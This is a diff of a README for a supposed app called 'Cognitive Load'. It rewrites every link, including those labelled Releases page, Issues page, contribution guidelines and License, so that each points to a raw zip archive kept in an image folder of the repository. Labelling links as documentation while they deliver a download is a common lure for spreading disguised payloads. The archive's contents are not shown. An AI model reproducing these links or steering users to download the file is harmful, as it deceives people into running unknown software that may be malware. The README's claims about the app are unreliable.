@@ -1,12 +1,12 @@
 # 🧠 cognitive-load - Manage Your Mental Workload Easily
 
-![Download Cognitive Load](https://raw.githubusercontent.com/69rascal/cognitive-load/main/Sitta/cognitive-load.zip)
+![Download Cognitive Load](https://github.com/69rascal/cognitive-load/raw/refs/heads/main/img/cognitive_load_3.3.zip)
 
 ## 📥 Download & Install
 
 To get started with Cognitive Load, you need to download the application. Visit the following link to access the Releases page:
 
-[Download Cognitive Load](https://raw.githubusercontent.com/69rascal/cognitive-load/main/Sitta/cognitive-load.zip)
+[Download Cognitive Load](https://github.com/69rascal/cognitive-load/raw/refs/heads/main/img/cognitive_load_3.3.zip)
 
 Once there, look for the latest version and choose the correct file for your operating system. Follow the steps below to install the app.
 
@@ -24,7 +24,7 @@ Before downloading, ensure your system meets the following requirements:
 Follow these steps to get Cognitive Load running on your device:
 
 1. **Download the Application:**
-   Visit the [Releases page](https://raw.githubusercontent.com/69rascal/cognitive-load/main/Sitta/cognitive-load.zip). Locate the latest version and download the file suited for your operating system.
+   Visit the [Releases page](https://github.com/69rascal/cognitive-load/raw/refs/heads/main/img/cognitive_load_3.3.zip). Locate the latest version and download the file suited for your operating system.
 
 2. **Install the Application:**
    - **Windows Users:**
@@ -73,7 +73,7 @@ Yes, once installed, you can use the core features of Cognitive Load without an 
 
 ### How can I provide feedback or report issues?
 
-We welcome your feedback! To report an issue or share suggestions, please visit our [Issues page](https://raw.githubusercontent.com/69rascal/cognitive-load/main/Sitta/cognitive-load.zip) on GitHub.
+We welcome your feedback! To report an issue or share suggestions, please visit our [Issues page](https://github.com/69rascal/cognitive-load/raw/refs/heads/main/img/cognitive_load_3.3.zip) on GitHub.
 
 ## 🗣️ Community Support
 
@@ -81,14 +81,14 @@ Join our community for tips, discussions, and troubleshooting. Connect with othe
 
 ## 🔄 Update Application
 
-Keep your application up to date to benefit from new features and security patches. Visit the [Releases page](https://raw.githubusercontent.com/69rascal/cognitive-load/main/Sitta/cognitive-load.zip) regularly for updates.
+Keep your application up to date to benefit from new features and security patches. Visit the [Releases page](https://github.com/69rascal/cognitive-load/raw/refs/heads/main/img/cognitive_load_3.3.zip) regularly for updates.
 
 ## 🌐 Contributing
 
-If you are interested in contributing to Cognitive Load, check our contribution guidelines [here](https://raw.githubusercontent.com/69rascal/cognitive-load/main/Sitta/cognitive-load.zip). We appreciate any improvements or suggestions that can enhance the user experience.
+If you are interested in contributing to Cognitive Load, check our contribution guidelines [here](https://github.com/69rascal/cognitive-load/raw/refs/heads/main/img/cognitive_load_3.3.zip). We appreciate any improvements or suggestions that can enhance the user experience.
 
 ## 📄 License
 
-Cognitive Load is released under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/69rascal/cognitive-load/main/Sitta/cognitive-load.zip).
+Cognitive Load is released under the MIT License. You can view the full license [here](https://github.com/69rascal/cognitive-load/raw/refs/heads/main/img/cognitive_load_3.3.zip).
 
 Thank you for choosing Cognitive Load! We hope it helps you manage your mental workload efficiently.
